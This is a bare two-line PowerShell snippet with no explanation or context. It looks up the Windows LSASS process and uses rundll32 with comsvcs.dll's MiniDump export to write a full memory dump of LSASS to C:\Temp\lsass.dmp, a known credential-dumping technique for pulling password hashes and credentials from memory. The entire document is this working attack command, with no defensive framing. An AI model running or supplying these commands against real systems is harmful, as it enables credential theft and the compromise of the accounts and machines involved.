$LsassPID = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $LsassPID C:\Temp\lsass.dmp full